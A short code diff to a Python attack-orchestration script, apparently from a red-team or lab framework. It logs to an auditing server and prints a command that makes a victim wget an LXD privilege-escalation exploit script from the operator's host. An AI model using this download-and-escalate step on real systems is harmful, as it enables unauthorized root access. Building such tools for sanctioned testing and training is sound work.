@@ -27,6 +27,7 @@ def listen(ip,port, t2, r_port, file_name, general_info):
 		print('[DEBBUG] wget -O exploit.sh {ip}:{r_port}/Privilege_Escalation_LXD/exploit.sh\n'.format(ip = ip, r_port = r_port))
 		
 		start = "\n"
+		# Use the own victim command line to inform the logging server instead of creating a request
 		if general_info['active'] == 'True':
 			start = 'wget \'' + informAudittingStart(general_info) + '\'"$(echo $$)"' + ' -O /dev/null\n'
 		print('[DEBBUG]', general_info['active'], type(general_info['active']))
@@ -191,23 +192,13 @@ def cleanup(conn, file_name, general_info):
 
 
 def informAudittingStart(general_info):
-	exploit = ''
-	match int(general_info['exploit']):
-		case 1:
-			exploit = 'LXD'
-		case default:
-			return ""
+	exploit = 'LXD'
 	# Pid is added on the terminal using $(echo $$)
 	url = general_info['host'] + ':' + general_info['port'] + '/start?exploit=' + exploit + '&pid='
 	return url
 
 def informAudittingStop(general_info):
-	exploit = ''
-	match int(general_info['exploit']):
-		case 1:
-			exploit = 'LXD'
-		case default:
-			return ""
+	exploit = 'LXD'
 	# Pid is added on the terminal using $(echo $$)
 	url = general_info['host'] + ':' + general_info['port'] + '/stop?exploit=' + exploit + '&pid='
 	return url
